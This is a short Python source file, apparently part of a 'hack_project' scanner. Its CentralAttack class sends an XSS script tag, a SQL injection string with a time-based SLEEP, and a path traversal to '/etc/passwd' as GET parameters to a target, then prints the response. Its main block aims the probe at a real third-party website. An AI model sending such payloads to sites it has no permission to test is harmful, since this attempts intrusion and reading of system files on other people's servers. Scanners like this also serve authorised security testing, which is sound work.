import uuid

from hack_project.config import def_headers
from pyspider.libs.base_crawl import *


class CentralAttack(BaseCrawl):
    """
    攻击payload
    """
    xsstring = '<script>alert("XSS");</script>'
    sqlistring = "UNION SELECT ALL FROM information_schema AND ' or SLEEP(5) or '"
    lfistring = '../../../../etc/passwd'

    def __init__(self, url, meta_data=None):
        super(CentralAttack, self).__init__()
        self.url = url

    def crawl_builder(self):
        builder = CrawlBuilder() \
            .set_url(self.url + "#CentralAttack") \
            .set_headers(def_headers) \
            .set_get_params_kv('a', self.xsstring) \
            .set_get_params_kv('b', self.sqlistring) \
            .set_get_params_kv('c', self.lfistring) \
            .set_task_id(uuid.uuid4())
        return builder

    def parse_response(self, response, task):
        print("response:{}".format(response.text))
        status_code = response.status_code
        redirect_url = response.url

        return {
            'status_code': status_code,
            'redirect_url': redirect_url,
            'content': response.text[:500],
            'content size': len(response.text),
        }


if __name__ == '__main__':
    CentralAttack("www.baidu.com").get_result()
